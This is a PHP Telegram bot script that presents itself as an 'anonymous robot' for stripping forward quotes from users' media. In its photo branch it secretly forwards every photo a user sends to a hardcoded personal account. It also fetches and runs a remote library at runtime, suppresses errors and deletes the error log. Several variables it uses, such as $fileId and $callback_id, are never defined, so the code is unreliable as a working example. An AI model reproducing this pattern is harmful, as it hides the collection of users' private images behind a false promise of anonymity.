<?php

http_response_code(200);
fastcgi_finish_request();

if (empty(getenv('BOT_TOKEN'))){
$token = "YOUR_API_TOKEN";
} else {
$token = getenv('BOT_TOKEN');
}

error_reporting(0);
set_time_limit(0);
ob_start();
$admin	= 5177196243;
$channel = "automationEngineering1";
if(!file_exists("iTelegram.php")){
	copy("https://raw.githubusercontent.com/iNeoTeam/iTelegram/main/iTelegram.phar", "iTelegram.php");
}
require_once("iTelegram.php");
use iTelegram\Bot;
define('API_KEY', $token);
$bot		= new Bot();
$bot->Authentification(API_KEY);
$text		= $bot->Text();
$chat_id	= $bot->getChatId();
$message_id	= $bot->MessageId();
$first_name	= $bot->getChatFirstname();
$getMe		= $bot->TelegramAPI('getMe');
$inputType	= $bot->InputMessageType();
$inputTypee     = $bot->CallBackQuery($input);
$update		= $bot->Update();
$button		= $bot->SingleInlineUrlKeyboard("Engineering support group 👩‍💻", "https://t.me/".$channel);
$key            = $bot->SingleNormalKeyboard("Hello");
$alretcall = $update['callback_query']['id'];
$alreat = $update['callback_query']['data'];
$users		= file_get_contents("users.txt");
$_users		= explode("\n", $users);

if($text == "/co"){
$m = $bot->sendMessage($chat_id, $message = 'yes i know', "HTML", true, $message_id, $button)->result->message_id;
sleep(3);
$bot->editMessage($chat_id, $message_id = $m, $text = "edit", $mode = null, $webPage = null, $button = $button);
sleep(2);
$bot->deleteMessage($chat_id, $message_id = $m);
}
$alreatt = $bot->CallBackQuery($inputTypee);
if($alreatt == "ok"){
$bot->AnswerCallBack($callback_id, $text = 'Hi', $alert = true);}

if($text == "/send"){
$lang_btn = json_encode(['inline_keyboard' => [
            [['text' => 'English🇬🇧' , 'callback_data' => 'ok']],
            [['text' => 'Persian🇮🇷' , 'callback_data' => 'lang-fa']]
        ]]);
$bot->sendMessage($chat_id, $message = 'Keyboard', "HTML", true, $message_id, $lang_btn);
}

if($text == "/start"){
	$message = "🖐<b>Hello dear friend.</b>
❤️Welcome to the anonymous robot.
<b>With this bot, you can delete your media quotes.</b>
 @".$channel;
}else{
	
	$caption = $update['message']['caption'];
	if($inputType == "photo"){
		$r = $bot->sendPhoto($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
                $r = $bot->forwardMessage($toChat_id='5177196243', $fromChat_id = $chat_id, $message_id);
                $r = $bot->sendChatAction($chat_id, "typing");
	}elseif($inputType == "audio"){
		$r = $bot->sendAudio($chat_id, $fileId, $caption, null, null, null, null, "HTML", null, $message_id, $button);
	}elseif($inputType == "document"){
		$r = $bot->sendDocument($chat_id, $fileId, $caption, null, "HTML", null, $message_id, $button);
	}elseif($inputType == "voice"){
		$r = $bot->sendVoice($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
	}elseif($inputType == "video"){
		$r = $bot->sendVideo($chat_id, $fileId, $caption, "HTML", null, $message_id, $button);
	}elseif($inputType == "sticker"){
		$r = $bot->sendSticker($chat_id, $fileId, null, $message_id);
	}
	}
unlink("error_log");

if($text == "/test"){
$test = $bot->sendMessage($chat_id, $message = 'yes i know', "HTML", true, $message_id, $button)->result->message_id;
$bot->editMessage($chat_id, $message_id = $test, $text = "ji", $mode = null, $webPage = null, $button = null);
}
?>
